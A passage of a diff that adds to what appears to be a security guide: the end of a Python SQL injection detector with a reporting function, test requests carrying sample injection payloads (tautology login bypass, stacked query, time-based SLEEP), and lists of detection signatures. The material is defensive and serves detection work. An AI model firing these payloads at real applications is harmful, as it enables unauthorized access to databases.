+            WHERE timestamp > ? AND blocked = 1
+        ''', (cutoff_time,))
+
+        blocked_count = cursor.fetchone()[0]
+
+        conn.close()
+
+        report = {
+            'generated_at': datetime.now().isoformat(),
+            'time_period_hours': hours,
+            'attack_statistics': [
+                {'type': row[0], 'count': row[1], 'avg_risk': row[2]}
+                for row in attack_stats
+            ],
+            'top_attacking_ips': [
+                {'ip': row[0], 'attempts': row[1], 'max_risk': row[2]}
+                for row in top_ips
+            ],
+            'blocked_attempts': blocked_count
+        }
+
+        return report
+
+# Example usage and testing
+def test_detector():
+    """Test the SQL injection detector"""
+    detector = SQLInjectionDetector()
+
+    # Test cases
+    test_requests = [
+        {
+            'ip': '192.168.1.100',
+            'url': '/login',
+            'params': {'username': "admin' OR '1'='1'--", 'password': 'test'},
+            'body': '',
+            'headers': {}
+        },
+        {
+            'ip': '192.168.1.101',
+            'url': '/search',
+            'params': {'q': "'; SELECT * FROM users; --"},
+            'body': '',
+            'headers': {}
+        },
+        {
+            'ip': '192.168.1.102',
+            'url': '/api/data',
+            'params': {},
+            'body': '{"id": "1\' AND SLEEP(5)--"}',
+            'headers': {}
+        }
+    ]
+
+    for i, request in enumerate(test_requests):
+        print(f"\nTesting request {i+1}:")
+        result = detector.analyze_request(request)
+
+        if result['detected_patterns']:
+            print(f"✗ SQL Injection detected from {result['source_ip']}")
+            print(f"  Types: {', '.join(result['injection_types'])}")
+            print(f"  Risk Score: {result['risk_score']}")
+            print(f"  Should Block: {result['should_block']}")
+        else:
+            print(f"✓ Clean request from {result['source_ip']}")
+
+    # Generate report
+    print("\n" + "="*50)
+    print("DETECTION REPORT")
+    print("="*50)
+
+    report = detector.generate_report(hours=1)
+    print(json.dumps(report, indent=2))
+
+if __name__ == "__main__":
+    test_detector()
+```
+
+### Key Detection Metrics
+
+**Behavioral Indicators:**
+
+- **Multiple injection types from single IP**: ≥3 different techniques
+- **Rapid attack pattern**: >20 attempts per minute
+- **Payload sophistication**: Advanced evasion techniques
+- **Response time analysis**: Delays indicating time-based attacks
+- **Error pattern analysis**: Database error messages in responses
+
+**Network Signatures:**
+
+- **Union-based**: `UNION SELECT` statements in parameters
+- **Boolean-based**: `OR 1=1`, `AND 1=1` logical operators
+- **Time-based**: `SLEEP()`, `WAITFOR DELAY`, `BENCHMARK()` functions
+- **Error-based**: `EXTRACTVALUE()`, `UPDATEXML()` XML functions
+- **Stacked queries**: Semicolon-separated SQL statements
+
+**Response Analysis:**
+
+- **HTTP 500 errors** with database error messages
+- **Abnormal response sizes** indicating data extraction
+- **Extended response times** for time-based attacks
+- **Content changes** in boolean-based attacks
+- **Header modifications** revealing server information
 
 ## Detection and Monitoring
 
